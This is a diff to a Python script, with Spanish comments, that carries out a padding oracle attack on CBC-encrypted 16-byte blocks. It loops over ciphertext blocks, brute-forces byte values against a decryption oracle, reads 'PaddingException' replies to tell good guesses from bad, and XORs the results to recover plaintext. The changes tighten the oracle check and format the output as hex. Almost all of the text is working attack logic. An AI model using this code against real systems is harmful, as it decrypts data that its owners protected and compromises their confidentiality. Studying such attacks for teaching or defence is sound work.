@@ -23,7 +23,7 @@ hash_ = memoryview(hash_b)
 decoded_bytes = [0] * len(hash_)
 
 blocks = int(len(hash_) / 16)
-initial_block = blocks - 1
+initial_block = blocks -1 
 
 print(f"Trabajando con \n {hash_data}")
 print(f"Longitud del hash : {len(hash_data)}")
@@ -61,8 +61,6 @@ for block_index in range(initial_block, 0, -1):
         print(f'Procesando bloque {block_index} byte {pos}')
         padding_oracle_data['working_byte'] = pos
 
-        
-
         # pruebo todos los valores de bytes, ultimo el valor original
         bytes_to_try = [x for x in range(0,block_data[pos])] + [x for x in range(block_data[pos]+1,256)] + [block_data[pos]]
         print(f"Bytes to try {bytes_to_try}")
@@ -76,12 +74,15 @@ for block_index in range(initial_block, 0, -1):
             print(binascii.hexlify(working_buffer).decode('utf8'))
             print(binascii.hexlify(padding_oracle_data['decoded_bytes']).decode('utf8'))
             try:
-                decript_data(working_buffer)
-                print(f"Encontrado {c} para {block_index} en la pos {pos}")
+                r = decript_data(working_buffer)
+                if 'PaddingException' in r:
+                    raise Exception()
+
+                print(f"Encontrado {c:02x} para {block_index} en la pos {pos}")
 
                 padding = 16 - pos
                 decoded_bytes[pos] = block_data[pos] ^ working_block[pos] ^ padding
-                print(f"Decodificado {decoded_bytes[pos]} Original {block_data[pos]} Actual {working_block[pos]} Padd {padding}")
+                print(f"Decodificado {decoded_bytes[pos]:02x} Original {block_data[pos]:02x} Actual {working_block[pos]:02x} Padd {padding:02x}")
 
                 #corrijo el padding para el bloque en proceso.        
                 for pad in range(pos,16):
@@ -113,4 +114,4 @@ for block_index in range(initial_block, 0, -1):
 
     padding_oracle_data['blocks_decoded'].append(block_index)
 
-print(json.dumps(padding_oracle_data))
+print(padding_oracle_data)
